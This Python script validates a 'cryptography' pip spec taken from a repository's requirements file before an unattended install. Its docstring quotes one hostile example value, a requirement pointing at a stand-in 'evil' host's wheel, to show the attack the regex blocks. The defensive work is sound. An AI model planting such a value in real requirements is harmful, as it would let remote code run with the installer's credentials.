#!/usr/bin/env python3
"""Print a SAFE pip spec for `cryptography`, taken from a requirements file.

`ensure-roles-deps.sh` runs `pip install` unattended, inside a scheduler tick,
with whatever this prints. The requirements file it reads lives inside the
repository — and a repository is a thing a role can end up writing to on an
abort path, where the guard reverts nothing by design.

So the file is treated as UNTRUSTED INPUT. `cryptography @ https://evil/x.whl`
satisfies a naive "starts with cryptography" test, and pip would fetch and
execute it as the tick, which holds the credential key. The accepted shape is
therefore exactly a name plus an optional PEP-440 version specifier: no URL, no
`@`, no extras, no whitespace inside, no shell metacharacter.

A line that does not match is IGNORED rather than fatal. The bare name still
installs a working package from the configured index, and refusing outright
would turn a malformed requirements file into a nightly outage — a worse
failure than the one being prevented, and a more likely one.

Usage:  python3 _pick_crypto_spec.py <path-to-requirements.txt>
Prints: a single line, always safe to pass to pip.
"""

from __future__ import annotations

import re
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from lib.portable import configure_std_streams  # noqa: E402


PACKAGE = "cryptography"
SAFE = re.compile(
    r"^cryptography(\s*(==|>=|<=|~=|!=|>|<)\s*[0-9][0-9A-Za-z.*+!-]*)?$"
)


def pick(path: Path) -> str:
    try:
        lines = path.read_text(encoding="utf-8").splitlines()
    except OSError:
        return PACKAGE
    for line in lines:
        line = line.split("#", 1)[0].strip()
        if not line or not line.lower().startswith(PACKAGE):
            continue
        return line if SAFE.match(line) else PACKAGE
    return PACKAGE


configure_std_streams()


if __name__ == "__main__":
    target = Path(sys.argv[1]) if len(sys.argv) > 1 else Path(PACKAGE)
    print(pick(target))
